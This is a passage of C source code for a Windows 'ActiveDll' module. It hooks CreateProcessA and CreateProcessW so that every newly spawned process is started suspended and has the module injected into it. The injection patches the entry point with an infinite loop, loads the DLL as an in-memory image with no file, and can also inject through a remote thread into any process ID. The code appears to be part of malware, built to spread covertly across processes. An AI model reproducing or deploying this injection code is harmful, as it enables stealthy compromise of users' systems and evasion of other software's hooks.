			{
				LONG Count = PROCESS_WAIT_TIME;
				// Waiting for a main thread to initialize
				do
				{
					ResumeThread(lpProcessInformation->hThread);
					Sleep(PROCESS_CHECK_TIME);
					SuspendThread(lpProcessInformation->hThread);
					Count -= PROCESS_CHECK_TIME;

					if (!NT_SUCCESS(Wow64NativeCall(Wow64CallPointers->pZwGetContextThread, 2, (ULONG64)lpProcessInformation->hThread, (ULONG64)&Ctx64)))
						ASSERT(FALSE);

				} while((Count > 0) && (Ctx64.Rip != Oep));

				ASSERT(Ctx64.Rip == Oep);

				// The main thread seems to be initialized, injecting the dll into the process
				if (bInjectImage)
					Status = AdInjectImage(lpProcessInformation, &g_CurrentAdContext, 0, NULL);
				else
					Status = PsSupWow64InjectDll64(lpProcessInformation, DllPath);

				// Restoring OEP bytes
				Wow64PatchProcessMemory64(lpProcessInformation->hProcess, Oep, (PCHAR)&Orig, sizeof(ULONG));
			}	// if (Wow64PatchProcessMemory64(
		}	// if (PsSupReadProcessMemoryArch(
	}	// if (NT_SUCCESS(Wow64GetProcessEntry64(lpProcessInformation->hProcess, &Oep)))

	return(Status);
}

#endif	// #ifndef	_WIN64


//
//	Injects current DLL into the process described by lpProcessInformation structure.
//	We cannot just inject a DLL into the newly-creted process with main thread suspended. This is because the main thread
//	 suspends BEFORE the process initializes. Injecting a DLL will fail within LoadLibrary function.
//	So we have to make sure the process is completely initialized. To do that we put an infinitive loop into the processes OEP.
//	Then we resume the main thread and wait until it reaches OEP. There we inject a DLL, restore the OEP and resume the main thread.
//
WINERROR ProcessInjectDll(
	LPPROCESS_INFORMATION lpProcessInformation,	// Target process and it's main thread information
	DWORD		ProcessCreateFlags,				// Process creation flags
	ULONG_PTR	ProcessEntry,					// Current process entry
	BOOL		bInjectImage					// specify TRUE if the DLL should be injected as image (without a file)
	)
{
	WINERROR Status = ERROR_UNSUCCESSFULL;
	CONTEXT	Ctx = {0};
	ULONG_PTR	bRead, Oep = 0;
	ULONG	Orig, Patch = 0xCCCCFEEB;
	HANDLE	hProcess = lpProcessInformation->hProcess;
	ULONG	InjectFlags = 0;
	LPTSTR	ArchPath = NULL, DllPath = g_CurrentModulePath;


	if (PsSupIsWow64Process(lpProcessInformation->dwProcessId, 0))
		InjectFlags = INJECT_WOW64_TARGET;

#ifndef _WIN64
	// Checking if we trying to inject a DLL from a WOW64 process into a native one
	if (!(InjectFlags & INJECT_WOW64_TARGET) && (g_CurrentProcessFlags & GF_WOW64_PROCESS))
	{
		if (bInjectImage || (ArchPath = PsSupNameChangeArch(g_CurrentModulePath)))
			Status = Wow64ProcessInjectDll64(lpProcessInformation, ArchPath, bInjectImage);
	}
	else
#endif
	{
		// Injecting DLL into the target process of the same architecture as current, 
		//	or into the WOW64 process from the 64-bit process
		Ctx.ContextFlags = CONTEXT_CONTROL | CONTEXT_INTEGER;

		if (!(Oep = ProcessEntry))
			Oep = GetProcessEntry(lpProcessInformation->hProcess, InjectFlags);

		// Saving original OEP bytes
		if (ReadProcessMemory(hProcess, (PVOID)Oep, &Orig, sizeof(ULONG), &bRead) && bRead == sizeof(ULONG))
		{
			// Writing infinitive loop to OEP
			if (PatchProcessMemory(hProcess, (PVOID)Oep, (PCHAR)&Patch, sizeof(ULONG)))
			{
				LONG Count = PROCESS_WAIT_TIME;
				Status = NO_ERROR;

				// Waiting for a main thread to initialize
				do
				{
					ResumeThread(lpProcessInformation->hThread);
					Sleep(PROCESS_CHECK_TIME);
					SuspendThread(lpProcessInformation->hThread);
					Count -= PROCESS_CHECK_TIME;
					if (!GetThreadContext(lpProcessInformation->hThread, &Ctx))
					{
						// Looks like the target process died while being initialized
						Status = ERROR_UNSUCCESSFULL;
						break;
					}
	
#ifdef	_WIN64
				} while((Count > 0) && (Ctx.Rip != Oep));

				if (Status == NO_ERROR)
				{
					ASSERT(Ctx.Rip == Oep);

					if ((InjectFlags & INJECT_WOW64_TARGET) && (ArchPath = PsSupNameChangeArch(DllPath)))
						DllPath = ArchPath;			

#else
				} while((Count > 0) && (Ctx.Eip != Oep));

				if (Status == NO_ERROR)
				{
					ASSERT(Ctx.Eip == Oep);
#endif
					// The main thread seems to be initialized, injecting the dll into the process
					if (bInjectImage)
						Status = AdInjectImage(lpProcessInformation, &g_CurrentAdContext, InjectFlags, NULL);
					else
						Status = PsSupInjectDllWithStub(lpProcessInformation, DllPath, InjectFlags);

					PatchProcessMemory(hProcess, (PVOID)Oep, (PCHAR)&Orig, sizeof(ULONG));
				}	// if (Status == NO_ERROR)
			}	// if (PatchProcessMemory(
		}	// if (ReadProcessMemory(
	}	// else

	if (Status == ERROR_UNSUCCESSFULL)
		Status = GetLastError();

	if (!(ProcessCreateFlags & CREATE_SUSPENDED))
		ResumeThread(lpProcessInformation->hThread);

	if (ArchPath)
		AppFree(ArchPath);

	if (Status != NO_ERROR)
	{
		DbgPrint("ActiveDll: Failed to Inject a DLL, error: %u\n", Status);
	}

	return(Status);
}


//
//	Creates remote thread within the specified process and injects client.dll into it using this thread.
//
WINERROR ProcessInjectDllWithThread(
	ULONG	Pid
	)
{
	WINERROR Status = ERROR_INVALID_FUNCTION;
	PROCESS_INFORMATION	Pi;

	Pi.dwProcessId = Pid;
	Pi.hProcess = OpenProcess(PROCESS_CREATE_THREAD | PROCESS_QUERY_INFORMATION | PROCESS_VM_OPERATION |
		PROCESS_VM_WRITE | PROCESS_VM_READ, FALSE, Pid);

	if (Pi.hProcess)
	{
		BOOL Wow64Target = PsSupIsWow64Process(0, Pi.hProcess);

		if (
#ifdef _M_AMD64
			(!Wow64Target)
#else
			!(g_CurrentProcessFlags & GF_WOW64_PROCESS) || Wow64Target
#endif
			)
		{
			LPTHREAD_START_ROUTINE pExitThread = 
				(LPTHREAD_START_ROUTINE)PsSupGetRealFunctionAddress(GetModuleHandleA(szNtdll), szExitThread);

			if (pExitThread)
			{
				if (Pi.hThread = CreateRemoteThread(Pi.hProcess, NULL, 0, pExitThread, NULL, CREATE_SUSPENDED, &Pi.dwThreadId))
				{
					Status = ProcessInjectDll(&Pi, 0, (ULONG_PTR)pExitThread, _INJECT_AS_IMAGE);
					CloseHandle(Pi.hThread);
				}
				else
					Status = GetLastError();
			}	// if (pExitThread)
			else
				Status = ERROR_NOT_FOUND;
		}
		else
			Status = ERROR_INVALID_FUNCTION;

		CloseHandle(Pi.hProcess);
	}	// if (Pi.hProcess)
	else
		Status = GetLastError();

	return(Status);
}



//
//	Sets Active DLL hooks. Currently CreateProcessA and CreateProcessW hooks are set.
//	Hooking kernel32 export first, and, then enumerating all loaded modules and hooking their IATs.
//	If the function succeeds, the return value is NO_ERROR. 
//	If the function fails, the return value is a nonzero error code defined in Winerror.h.
//
static INT ActiveDllSetHooks(VOID)
{
	INT Status = NO_ERROR;
	LONG NumberHooks;
	PHOOK_DESCRIPTOR ExportHooks;
	PHOOK_DESCRIPTOR IatHooks;
	HMODULE Advapi32 = GetModuleHandleA(szAdvapi32);

	CHAR SystemMajor = LOBYTE(LOWORD(g_SystemVersion));
	CHAR SystemMinor = HIBYTE(LOWORD(g_SystemVersion));

	if (SystemMajor > 6 || (SystemMajor == 6 && SystemMinor > 0))
	{
		// Windows 7 and higher
		ExportHooks = (PHOOK_DESCRIPTOR)&ProcExportHooksEx;
		IatHooks = (PHOOK_DESCRIPTOR)&ProcIatHooksEx;
		NumberHooks = sizeof(ProcExportHooksEx) / sizeof(HOOK_DESCRIPTOR);
	}
	else
	{
		// Windows Vista and lower
		ExportHooks = (PHOOK_DESCRIPTOR)&ProcExportHooks;
		IatHooks = (PHOOK_DESCRIPTOR)&ProcIatHooks;
		NumberHooks = sizeof(ProcExportHooks) / sizeof(HOOK_DESCRIPTOR);
	}

	if ((Status = SetMultipleHooks(ExportHooks, NumberHooks, NULL)) == NO_ERROR)
	{
		HMODULE*	ModArray = NULL;
		ULONG		ModCount = 0;

		if ((Status = PsSupGetProcessModules(GetCurrentProcess(), &ModArray, &ModCount)) == NO_ERROR)
		{
			ULONG i;
			ULONG NumberIatHooks = (sizeof(ProcIatHooks) / sizeof(HOOK_DESCRIPTOR));

			for (i=0;i<ModCount;i++)
			{
				if ((ModArray[i] != g_CurrentModule) && (ModArray[i] != Advapi32))
					SetMultipleHooks(IatHooks, NumberIatHooks, ModArray[i]);
			}
			AppFree(ModArray);
		}
		
		if (Status != NO_ERROR)
			RemoveMultipleHooks((PHOOK_DESCRIPTOR)&ProcExportHooks, NumberHooks);
		
	}
	
	return(Status);
}

/////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
//	This thread attempts to inject current DLL into specified process in a loop.
//	The loop is required to wait until process initialization completes.
//
LONG WINAPI DllInjectThread(ULONG ProcessId)
{
	LONG Status;

	// ERROR_PARTIAL_COPY currently means that process's PEB is still paged out and we were unable
	//  to enumerate kernel32 base or to read or write process memory.
	while ((Status = PsSupInjectDll(ProcessId, g_CurrentModulePath, 0)) == ERROR_PARTIAL_COPY)
		Sleep(10);

	DbgPrint("ActiveDll: Dll inject thread for process 0x%x terminated with status: %u\n", ProcessId, Status);

	return(Status);
}


INT CreateInjectThread(ULONG ProcessId)
{
	INT Status = NO_ERROR;
	ULONG ThreadId;
	HANDLE hThread = CreateThread(NULL, 0x1000, (LPTHREAD_START_ROUTINE)&DllInjectThread,(PVOID)(ULONG_PTR)ProcessId, 0, &ThreadId);
	if (hThread)
		CloseHandle(hThread);
	else
		Status = GetLastError();

	return(Status);
}



// ---- Functions -----------------------------------------------------------------------------------------------------------

// Creates new process and injects dll in it
BOOL WINAPI AdCreateProcessA(
	PCHAR lpApplicationName,
	PCHAR lpCommandLine,
	LPSECURITY_ATTRIBUTES lpProcessAttributes,
	LPSECURITY_ATTRIBUTES lpThreadAttributes,
	BOOL bInheritHandles,
	DWORD dwCreationFlags,
	LPVOID lpEnvironment,
	PCHAR lpCurrentDirectory,
	LPSTARTUPINFOA lpStartupInfo,
	LPPROCESS_INFORMATION lpProcessInformation
	)
{
	
	ULONG Flags = dwCreationFlags;
	BOOL Res = FALSE;
	ptr_CreateProcessA	pCreateProcessA;

	// Resolving real address of CreateProcessA function directly from the image file since the function could be hooked earlier.
	if (pCreateProcessA = PsSupGetRealFunctionAddress(GetModuleHandle(szKernel32), szCreateProcessA))
	{
		dwCreationFlags |= CREATE_SUSPENDED;

		Res = (pCreateProcessA)(lpApplicationName, lpCommandLine,	lpProcessAttributes, lpThreadAttributes, bInheritHandles, 
			dwCreationFlags, lpEnvironment, lpCurrentDirectory, lpStartupInfo, lpProcessInformation);

		if (Res)
			ProcessInjectDll(lpProcessInformation, Flags, 0, _INJECT_AS_IMAGE);
	}

	return(Res);
}

BOOL WINAPI CallCreateProcessA(
	PCHAR lpApplicationName,
	PCHAR lpCommandLine,
	LPSECURITY_ATTRIBUTES lpProcessAttributes,
	LPSECURITY_ATTRIBUTES lpThreadAttributes,
	BOOL bInheritHandles,
	DWORD dwCreationFlags,
	LPVOID lpEnvironment,
	PCHAR lpCurrentDirectory,
	LPSTARTUPINFOA lpStartupInfo,
	LPPROCESS_INFORMATION lpProcessInformation
	)
{
	
	ULONG Flags = dwCreationFlags;
	BOOL Res;

	dwCreationFlags |= CREATE_SUSPENDED;

#ifdef _KERNEL_MODE_INJECT
	Res = CreateProcessA(lpApplicationName, lpCommandLine,	lpProcessAttributes, lpThreadAttributes, bInheritHandles, 
		dwCreationFlags, lpEnvironment, lpCurrentDirectory, lpStartupInfo, lpProcessInformation);
#else
	Res = ((ptr_CreateProcessA)hook_kernel32_CreateProcessA.Original)(lpApplicationName, lpCommandLine,	lpProcessAttributes, lpThreadAttributes, bInheritHandles, 
		dwCreationFlags, lpEnvironment, lpCurrentDirectory, lpStartupInfo, lpProcessInformation);
#endif


	if (Res)
		ProcessInjectDll(lpProcessInformation, Flags, 0, _INJECT_AS_IMAGE);

	return(Res);
}


BOOL WINAPI CallCreateProcessW(
	LPWSTR lpApplicationName,
	LPWSTR lpCommandLine,
	LPSECURITY_ATTRIBUTES lpProcessAttributes,
	LPSECURITY_ATTRIBUTES lpThreadAttributes,
	BOOL bInheritHandles,
	DWORD dwCreationFlags,
	LPVOID lpEnvironment,
	LPWSTR lpCurrentDirectory,
	LPSTARTUPINFOW lpStartupInfo,
	LPPROCESS_INFORMATION lpProcessInformation
	)
{
	ULONG Flags = dwCreationFlags;
	BOOL Res;

	dwCreationFlags |= CREATE_SUSPENDED;

#ifdef _KERNEL_MODE_INJECT
	Res = CreateProcessW(lpApplicationName, lpCommandLine,	lpProcessAttributes, lpThreadAttributes, bInheritHandles, 
		dwCreationFlags, lpEnvironment, lpCurrentDirectory, lpStartupInfo, lpProcessInformation);
#else
	ASSERT(hook_kernel32_CreateProcessW.Original);
	Res = ((ptr_CreateProcessW)hook_kernel32_CreateProcessW.Original)(lpApplicationName, lpCommandLine,	lpProcessAttributes, lpThreadAttributes, bInheritHandles, 
		dwCreationFlags, lpEnvironment, lpCurrentDirectory, lpStartupInfo, lpProcessInformation);
#endif

	if (Res)
		ProcessInjectDll(lpProcessInformation, Flags, 0, _INJECT_AS_IMAGE);
	
	return(Res);
}


//
//	Initializes Active Dll engine and sets Active Dll hooks.
//	If the function succeeds, the return value is NO_ERROR. 
//	If the function fails, the return value is a nonzero error code defined in Winerror.h.
//
WINERROR AcStartup(
	PVOID	pContext,	// ActiveDll context pointer passed to the DLL when it is being injected as PE-image
	BOOL	bSetHooks,	// Specify TRUE to set ActiveDLL hooks
	// Following are two callbacks that allow to modify command line for CreateProcessA and CreateProcessW functions
	AC_CMD_LINE_MODIFY_CALLBACKA	CmdLineModifyCallbackA,	// Optional
	AC_CMD_LINE_MODIFY_CALLBACKW	CmdLineModifyCallbackW	// Optional
	)
{
	WINERROR Status = NO_ERROR;

#if _INJECT_AS_IMAGE
	if (!pContext)
	{
		if ((Status = PsSupGetModulePath(g_CurrentModule, &g_CurrentModulePath)) == NO_ERROR)
		{
			PCHAR	ArchPath;

			if (ArchPath = PsSupNameChangeArch(g_CurrentModulePath))
			{
#ifdef _M_AMD64
				Status = FilesLoadFile(g_CurrentModulePath, (PCHAR*)&g_CurrentAdContext.pModule64, &g_CurrentAdContext.Module64Size);
				if (Status == NO_ERROR)
					FilesLoadFile(ArchPath, (PCHAR*)&g_CurrentAdContext.pModule32, &g_CurrentAdContext.Module32Size);
			
#else
				Status = FilesLoadFile(g_CurrentModulePath, (PCHAR*)&g_CurrentAdContext.pModule32, &g_CurrentAdContext.Module32Size);
				if (Status == NO_ERROR)
					FilesLoadFile(ArchPath, (PCHAR*)&g_CurrentAdContext.pModule64, &g_CurrentAdContext.Module64Size);
#endif
				AppFree(ArchPath);
			}	// if (ArchPath = PsSupNameChangeArch(g_CurrentModulePath))
		}	// if ((Status = PsSupGetModulePath(g_CurrentModule, &g_CurrentModulePath)) == NO_ERROR)
	}	// if (!pContext)
	else
		memcpy(&g_CurrentAdContext, pContext, sizeof(AD_CONTEXT));
#endif

	g_CmdLineModifyCallbackA = CmdLineModifyCallbackA;
	g_CmdLineModifyCallbackW = CmdLineModifyCallbackW;

	if (Status == NO_ERROR && bSetHooks)
		Status = ActiveDllSetHooks();
	
	return(Status);
}



VOID AcCleanup(VOID)
{
	// We do not cleanup active dll hooks, because all of them are linked into the application g_HookList, and 
	//  will be removed together with all other hooks.

}